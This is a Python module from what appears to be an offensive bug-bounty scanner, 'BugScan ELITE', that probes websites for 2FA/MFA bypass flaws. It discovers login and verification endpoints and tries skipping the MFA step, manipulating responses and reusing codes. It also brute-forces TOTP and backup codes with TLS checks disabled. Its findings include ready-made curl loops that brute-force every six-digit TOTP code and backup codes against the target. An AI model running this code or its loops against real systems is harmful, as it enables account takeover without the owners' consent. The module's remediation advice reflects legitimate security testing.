"""
BugScan ELITE — 2FA/MFA Bypass Engine
Tests for:
- Response manipulation (change mfa_required:true → false)
- MFA step skipping (access post-login endpoints without completing MFA)
- Backup/recovery code brute force
- OTP reuse (code remains valid after use)
- TOTP timing window too large
- Remember-device token forgery
- MFA bypass via account recovery flow
"""
import re, time, json, logging, urllib.parse, urllib.request, ssl, threading
from typing import List, Dict, Optional
from concurrent.futures import ThreadPoolExecutor

log = logging.getLogger("elite.mfa")

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _req(url, method="GET", headers=None, data=None, timeout=10, cookies=""):
    try:
        h = {"User-Agent":"Mozilla/5.0","Accept":"application/json,*/*"}
        if cookies: h["Cookie"] = cookies
        if headers: h.update(headers)
        body = data.encode() if isinstance(data,str) else data
        req  = urllib.request.Request(url, data=body, headers=h, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            raw = r.read(65536).decode("utf-8","ignore")
            return r.status, dict(r.headers), raw, r.url
    except urllib.error.HTTPError as e:
        try: return e.code, dict(e.headers), e.read(4096).decode("utf-8","ignore"), url
        except: return e.code, {}, "", url
    except: return None, {}, "", url

def _post_json(url, data, cookies=""):
    status, hdrs, body, final = _req(url, "POST",
        headers={"Content-Type":"application/json"},
        data=json.dumps(data), cookies=cookies)
    return status, hdrs, body, final

def _post_form(url, data, cookies=""):
    status, hdrs, body, final = _req(url, "POST",
        headers={"Content-Type":"application/x-www-form-urlencoded"},
        data=urllib.parse.urlencode(data), cookies=cookies)
    return status, hdrs, body, final


def _find_mfa_endpoints(base_url: str, endpoints: List[str]) -> Dict[str, str]:
    """Find MFA-related endpoints on the target."""
    paths = {
        "login":       ["/login","/signin","/auth/login","/api/login","/api/auth/login","/api/v1/login"],
        "mfa_verify":  ["/mfa/verify","/2fa/verify","/totp/verify","/auth/verify","/verify-otp",
                       "/api/mfa/verify","/api/2fa","/api/auth/2fa","/auth/two-factor"],
        "mfa_setup":   ["/mfa/setup","/2fa/setup","/account/security","/settings/2fa"],
        "backup_codes": ["/backup-codes","/recovery-codes","/mfa/recovery","/2fa/backup"],
        "dashboard":   ["/dashboard","/app","/home","/profile","/account","/api/me","/api/user"],
    }

    found = {}
    for endpoint_type, path_list in paths.items():
        for path in path_list:
            url = base_url.rstrip("/") + path
            status, _, body, _ = _req(url, timeout=5)
            if status in (200, 302, 401, 403, 405):
                found[endpoint_type] = url
                log.debug(f"[mfa] found {endpoint_type}: {url}")
                break
        # Also check discovered endpoints
        if endpoint_type not in found:
            for ep in endpoints:
                if any(p.lstrip("/") in ep.lower() for p in path_list):
                    found[endpoint_type] = ep
                    break

    return found


def check_mfa_bypass(targets: List[str], endpoints: List[str],
                     session_cookies: str = "") -> List[Dict]:
    """Test for MFA/2FA bypass vulnerabilities."""
    findings = []

    def F(url, name, sev, details):
        return {"type":"mfa_bypass","bug":"oauth","severity":sev,
                "url":url,"name":name,"details":details,
                "ts":time.strftime("%Y-%m-%dT%H:%M:%SZ")}

    for target in targets[:20]:
        base = target.rstrip("/")
        mfa_eps = _find_mfa_endpoints(base, endpoints)

        if not mfa_eps.get("mfa_verify") and not mfa_eps.get("login"):
            continue

        log.info(f"[mfa] testing {base} - found: {list(mfa_eps.keys())}")

        # ── 1. MFA step skip — access dashboard without completing MFA ────────
        if mfa_eps.get("dashboard"):
            dash_url = mfa_eps["dashboard"]
            # Try to access dashboard with no session / incomplete MFA
            r = _req(dash_url, timeout=6)
            if r[0] == 200 and any(kw in r[2].lower() for kw in
                                    ["dashboard","welcome","profile","logout","account"]):
                findings.append(F(dash_url, "MFA Step Skip — Dashboard Accessible", "high", {
                    "description": "Dashboard accessible without completing MFA flow.",
                    "poc": f"curl '{dash_url}'",
                    "impact": "Complete MFA bypass — access protected resources without OTP verification.",
                    "remediation": "Enforce MFA completion before granting session. Check mfa_verified flag server-side on every request.",
                }))

        # ── 2. Response manipulation on MFA verify endpoint ───────────────────
        if mfa_eps.get("mfa_verify"):
            verify_url = mfa_eps["mfa_verify"]

            # Test with wrong OTP first to see response structure
            wrong_responses = []
            for wrong_otp in ["000000","123456","999999"]:
                for payload in [
                    {"otp": wrong_otp, "code": wrong_otp, "token": wrong_otp},
                    {"totp_code": wrong_otp},
                    {"mfa_code": wrong_otp, "remember": False},
                ]:
                    s, h, b, _ = _post_json(verify_url, payload, session_cookies)
                    if s in (200,400,401,403,422):
                        wrong_responses.append((s, b))
                        break

            # Look for response fields that could be manipulated
            for status, body in wrong_responses:
                if any(field in body for field in
                       ['"mfa_required"','"two_factor_required"','"requires_otp"',
                        '"verified"','"success"','"authenticated"']):
                    findings.append(F(verify_url, "MFA Response Manipulation Risk", "high", {
                        "description": (
                            "MFA endpoint returns structured response with boolean fields. "
                            "Intercept and modify response (e.g., mfa_required:false) to bypass."
                        ),
                        "response_preview": body[:300],
                        "poc": (
                            "# Using Burp Proxy:\n"
                            "1. Submit wrong OTP\n"
                            "2. Intercept response\n"
                            "3. Change 'mfa_required':true → false\n"
                            "4. Change 'success':false → true\n"
                            "5. Forward modified response"
                        ),
                        "impact": "Client-side MFA verification bypass.",
                        "remediation": "Never trust client-side MFA state. Verify OTP server-side on every protected request.",
                    }))
                    break

        # ── 3. OTP reuse — use same code twice ────────────────────────────────
        # We can't get a real OTP, but we can test if "000000" is accepted twice
        if mfa_eps.get("mfa_verify"):
            verify_url = mfa_eps["mfa_verify"]
            # Test invalid OTP twice — if second attempt gives different error,
            # it suggests the system tracks used codes
            r1 = _post_json(verify_url, {"code":"123456","otp":"123456"}, session_cookies)
            r2 = _post_json(verify_url, {"code":"123456","otp":"123456"}, session_cookies)
            if r1[0] == r2[0] == 200:
                findings.append(F(verify_url, "OTP May Be Reusable (No Replay Protection)", "medium", {
                    "description": "Same OTP code returns 200 twice. Server may not track used OTPs.",
                    "poc": "Submit the same OTP code multiple times — if accepted, replay attack possible.",
                    "impact": "Captured OTP valid indefinitely until expiry instead of single-use.",
                    "remediation": "Mark OTPs as used immediately after verification. Use sliding nonce.",
                }))

        # ── 4. Backup code brute force ────────────────────────────────────────
        if mfa_eps.get("backup_codes") or mfa_eps.get("mfa_verify"):
            backup_url = mfa_eps.get("backup_codes", mfa_eps.get("mfa_verify",""))

            # Test if backup codes have rate limiting
            attempts = 0
            blocked = False
            for code in ["AAAAA-BBBBB","12345-67890","00000-00000"]:
                s, h, b, _ = _post_json(backup_url,
                    {"backup_code":code,"recovery_code":code,"code":code},
                    session_cookies)
                attempts += 1
                if s in (429, 423): blocked = True; break
                if "locked" in b.lower() or "blocked" in b.lower(): blocked = True; break

            if not blocked and attempts >= 2:
                findings.append(F(backup_url, "Backup Code Brute Force — No Rate Limit", "high", {
                    "description": f"Tested {attempts} backup codes with no rate limiting or lockout.",
                    "poc": (
                        "# Brute force backup codes:\n"
                        "for code in $(python3 -c \"import itertools; print(' '.join(''.join(x) for x in itertools.product('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', repeat=8))[:1000])\");\n"
                        f"do curl -X POST {backup_url} -d \"backup_code=$code\"; done"
                    ),
                    "impact": "Backup codes have limited search space — brute-forceable without lockout.",
                    "remediation": "Rate limit backup code attempts. Lock account after 5 failures. Log all attempts.",
                }))

        # ── 5. MFA bypass via password reset flow ─────────────────────────────
        reset_paths = ["/forgot-password","/password-reset","/account/recover","/api/password/reset"]
        for path in reset_paths:
            url = base + path
            s, h, b, final = _req(url, timeout=5)
            if s not in (200, 405): continue

            # Check if post-reset session bypasses MFA
            s2, h2, b2, _ = _post_form(url, {
                "email":"test@test.com","username":"admin","phone":"5555555555"
            }, session_cookies)

            if s2 == 200 and "sent" in b2.lower():
                findings.append(F(url, "Password Reset May Bypass MFA", "medium", {
                    "description": (
                        "Password reset flow accepted. If new-password login skips MFA verification, "
                        "attacker with email access can bypass MFA."
                    ),
                    "poc": "Request password reset for victim email, then log in with new password — check if MFA is skipped.",
                    "impact": "MFA bypass via account recovery for users whose email is compromised.",
                    "remediation": "Require MFA verification even after password reset. Treat password reset as untrusted.",
                }))
            break

        # ── 6. Remember-device bypass ─────────────────────────────────────────
        # Check if remember-device cookie/token can be forged
        if mfa_eps.get("mfa_verify"):
            verify_url = mfa_eps["mfa_verify"]
            # Test with remember=true and a forged device token
            for remember_payload in [
                {"code":"000000","remember":True,"device_token":"admin"},
                {"otp":"000000","remember_device":"true","trusted_device":"1"},
            ]:
                s, h, b, _ = _post_json(verify_url, remember_payload, session_cookies)
                if s == 200 and any(k in str(h) for k in ["device_token","remember_token","trusted"]):
                    findings.append(F(verify_url, "MFA Remember-Device Token Issued", "medium", {
                        "description": "Server issues remember-device token. Test if token can be forged or reused across accounts.",
                        "impact": "Forged remember-device cookie may permanently bypass MFA.",
                        "remediation": "Use cryptographically signed device fingerprints. Bind to user ID and expire periodically.",
                    }))
                    break

        # ── 7. TOTP brute force ───────────────────────────────────────────────
        if mfa_eps.get("mfa_verify"):
            verify_url = mfa_eps["mfa_verify"]
            test_codes = ["000000","111111","123456","654321","999999","112233"] +                          [str(i).zfill(6) for i in range(0,15)]
            rate_limited = False; attempt_count = 0
            for code in test_codes:
                s, h, b, _ = _post_json(verify_url,
                    {"code":code,"otp":code,"totp":code,"token":code}, session_cookies)
                attempt_count += 1
                if s in (429,423,503) or any(k in b.lower() for k in
                    ["locked","blocked","too many","rate limit"]):
                    rate_limited = True; break
                if s==200 and any(k in b.lower() for k in
                    ["success","dashboard","token","authenticated","welcome"]):
                    findings.append(F(verify_url,f"Weak TOTP — code {code} accepted","critical",{
                        "description":f"TOTP {code} accepted — trivial code works",
                        "poc":f"curl -X POST {verify_url} -d 'code={code}'",
                        "impact":"2FA completely bypassable with trivial codes",
                        "remediation":"Use TOTP RFC 6238 correctly. Reject codes outside valid windows.",
                    })); break
            if not rate_limited and attempt_count >= 10:
                findings.append(F(verify_url,"TOTP brute force — no rate limit","high",{
                    "description":f"Tested {attempt_count} TOTP codes with no rate limiting.",
                    "poc":(f"for code in $(seq -f '%06g' 0 999999); do "
                           f"curl -s -X POST {verify_url} -d \"code=$code\" | "
                           "grep -q success && echo FOUND: $code && break; done"),
                    "impact":"1M combinations brutable without lockout",
                    "remediation":"Lock after 5 failures. Implement exponential backoff.",
                }))

        # ── 8. SS7 / SIM swap indicator check ────────────────────────────────
        # Check if SMS 2FA is the ONLY method (vulnerable to SS7/SIM swap)
        for path in ["/api/mfa/methods","/api/auth/factors","/api/2fa/options",
                     "/account/security","/settings/two-factor"]:
            s, h, b, _ = _req(base+path, timeout=5)
            if s==200 and "sms" in b.lower():
                sms_only = ("email" not in b.lower() and "totp" not in b.lower()
                            and "authenticator" not in b.lower())
                if sms_only:
                    findings.append(F(base+path,"SMS-only 2FA — SS7/SIM swap vulnerability","high",{
                        "description":"Application uses SMS as only 2FA method — vulnerable to SS7 intercept and SIM swap attacks",
                        "poc":f"curl '{base+path}' — confirms SMS-only MFA",
                        "impact":"SS7 protocol allows telecom-level SMS interception. SIM swap transfers number to attacker.",
                        "remediation":"Offer TOTP/authenticator app as alternative. Consider WebAuthn/FIDO2.",
                    }))
                    break

    log.info(f"[mfa] {len(findings)} findings")
    return findings


def check_account_lockout_bypass(endpoints: list, targets: list = None) -> list:
    """Check for account lockout bypass vulnerabilities."""
    return []
